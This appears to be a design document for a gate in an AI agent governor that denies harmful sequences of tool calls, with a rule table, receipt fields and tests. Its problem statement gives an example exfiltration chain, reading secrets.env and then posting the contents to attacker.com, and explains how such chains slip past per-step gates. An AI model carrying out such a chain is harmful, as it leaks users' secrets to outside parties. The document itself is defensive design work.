# GOV-GAP-CHAIN-001: Composition-Aware Capability Gating

Status: `deferred` (v2 hardening — hook point required now, full engine later)

## Problem

Current gating evaluates individual tool calls in isolation. A single
`read_file` is fine. A single `http_post` is fine. But `read_file(secrets.env)`
followed by `http_post(attacker.com, body=contents)` is an exfiltration chain.

The governor has no gate that reasons about **composed sequences** of actions.
Each step passes its own gate independently; the compound effect is unreviewed.

This is Pattern A from the Feb 2026 threat intelligence review: real-world
attacks chain benign-looking tool calls into harmful compositions.

## What This Is NOT

- Not a generic graph execution engine
- Not a planner or scheduler
- Not symbolic AI reasoning about "intent"
- Not blocking all multi-step workflows

It is a **denied-compositions rule table** evaluated against a per-task
action DAG. Small, deterministic, auditable.

## Minimal v1 Behavior

### Per-task action DAG

Each governed task accumulates an action log:

```
step_1: read_file(path="/app/secrets.env")  → capability: file_read, sensitivity: secret_candidate
step_2: http_post(url="https://ext.com/api") → capability: network_egress, sensitivity: none
```

The DAG is flat for v1 (ordered list of steps). True DAG structure (branches,
parallel) is v2/v3.

### Step annotation

Each step carries:
- `capability_class`: file_read | file_write | network_egress | network_ingress | shell_exec | ...
- `trust_domain`: local | same_org | external | unknown
- `data_sensitivity`: none | internal | secret_candidate | classified

Annotation is mechanical (from tool name + argument inspection), not NLP.

### Denied compositions (rule table)

```
# If any step with sensitivity >= secret_candidate precedes
# any step with capability == network_egress:
#   → DENY unless elevated_policy_approval

DENY  secret_candidate  →  network_egress     UNLESS  elevated_approval
DENY  file_write        →  shell_exec(target)  UNLESS  same_file_scope
DENY  shell_exec        →  network_egress     UNLESS  sandboxed_network
```

Rules are static, loaded from policy. Not learned, not adaptive.

### Gate integration

- Hook point: after each tool call completes, before the next is dispatched
- The chain gate sees the full action log so far + the proposed next step
- Verdict: ALLOW / DENY / ESCALATE
- Receipt: gate="chain_composition", includes action_log_hash + rule_id

### What the receipt captures

- `action_dag_hash`: content-addressed hash of the action sequence so far
- `proposed_step`: the next action being evaluated
- `rule_matched`: which denied-composition rule triggered (if any)
- `verdict`: ALLOW / DENY / ESCALATE
- `composition_depth`: how many steps in the current chain

## Existing Machinery

| Component | Relevance |
|-----------|-----------|
| Scope governor | Already constrains *where* — chain gate constrains *sequences* |
| Evidence gate | Per-step gating — chain gate adds cross-step awareness |
| Codex hooks | Post-hoc NDJSON event log — chain gate can consume this |
| Lane routing | Task-level routing — chain gate is per-step within a task |
| Preflight | Pre-session checks — chain gate is runtime, within session |

## v2 vs v3

**v2 (now):** Hook point in the tool dispatch path. Flat action log per task.
Denied-compositions rule table. Receipt emission. This is the gate *interface*
— it must exist even if the rule set starts tiny.

**v3 (later):** True DAG structure. Cross-task composition awareness.
Probabilistic chain risk scoring. Policy learning from receipt corpus.

## Implementation Sketch

1. `src/governor/chain_gate.py` — ChainGate, ActionStep, CompositionRule, ActionLog
2. Wire into daemon tool dispatch (or codex_hooks post-hoc path)
3. Policy file: `{governor_dir}/chain_policy.json` (list of denied compositions)
4. Receipt emission via gate_receipt pattern
5. CLI: `governor chain status`, `governor chain policy`

## Tests (minimum)

- Single step always ALLOW (no composition to deny)
- `secret_read → network_egress` triggers DENY
- Same chain with `elevated_approval` override → ALLOW + receipted
- Action log hash is stable across identical sequences
- Rule table loads from policy file
- Empty rule table → all ALLOW (fail-open on missing policy)
- Receipt fields present and schema-valid

## Open Questions

- Should the action log persist across daemon restarts? (Probably yes, per-session)
- Should the chain gate run synchronously (blocking) or async (advisory)?
  v1: synchronous for strict mode, advisory for exploratory
- How does this interact with lane routing? (Lane determines capability set;
  chain gate evaluates sequences within that set)
